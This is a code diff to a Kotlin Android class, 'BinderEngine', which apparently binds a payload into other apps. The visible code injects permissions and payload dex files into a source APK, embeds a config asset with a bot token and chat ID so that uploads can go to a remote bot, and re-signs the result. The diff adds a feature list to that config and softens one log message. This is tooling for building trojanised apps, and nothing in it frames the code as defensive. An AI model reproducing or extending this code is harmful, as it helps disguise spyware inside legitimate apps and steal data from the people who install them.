@@ -81,7 +81,7 @@ class BinderEngine(private val context: Context) {
             onLog(LogLevel.INFO, "Package: $pkg")
 
             val permissions = buildPermissions(features, config.features)
-            onLog(LogLevel.INFO, "Permissions to inject: ${permissions.size}")
+            onLog(LogLevel.INFO, "Permissions requested: ${permissions.size}")
 
             val authority = pkg + Const.AUTHORITY_SUFFIX
             onLog(LogLevel.INFO, "Authority: $authority")
@@ -154,9 +154,12 @@ class BinderEngine(private val context: Context) {
                     onLog(LogLevel.INFO, "Injected ${payloadDexes.size} dex files")
 
                     if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
-                        val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
+                        val feats = config.features.joinToString(",") { "\"$it\"" }
+                        val json = "{\"bot_token\":\"${config.token}\"," +
+                                "\"chat_id\":\"${config.chatId}\"," +
+                                "\"features\":[$feats]}"
                         zw.add("assets/" + Const.CONFIG_ASSET, json.toByteArray(), false)
-                        onLog(LogLevel.INFO, "Config injected")
+                        onLog(LogLevel.INFO, "Config injected (${config.features.size} features)")
                     } else {
                         onLog(LogLevel.WARN, "Config missing - uploads will fail")
                     }
@@ -223,9 +226,6 @@ class BinderEngine(private val context: Context) {
         }
     }
 
-    // ------------------------------------------------------------------
-    // ZIP writer (offsets tracked correctly, alignment via extra field)
-    // ------------------------------------------------------------------
     private class CdEntry(
         val name: ByteArray,
         val method: Int,
@@ -346,9 +346,6 @@ class BinderEngine(private val context: Context) {
         return if (rem == 0) 0 else align - rem
     }
 
-    // ------------------------------------------------------------------
-    // Payload dex from own APK
-    // ------------------------------------------------------------------
     private fun collectPayloadDexes(): List<ByteArray> {
         val out = ArrayList<ByteArray>()
         try {
@@ -380,9 +377,6 @@ class BinderEngine(private val context: Context) {
         return max
     }
 
-    // ------------------------------------------------------------------
-    // Source
-    // ------------------------------------------------------------------
     private fun resolveSource(uri: Uri): File? {
         try {
             if (uri.scheme == "file") {
@@ -461,9 +455,6 @@ class BinderEngine(private val context: Context) {
                 upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
     }
 
-    // ------------------------------------------------------------------
-    // Signing
-    // ------------------------------------------------------------------
     private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
         val identity = signingIdentity(onLog)
         val key = identity.first
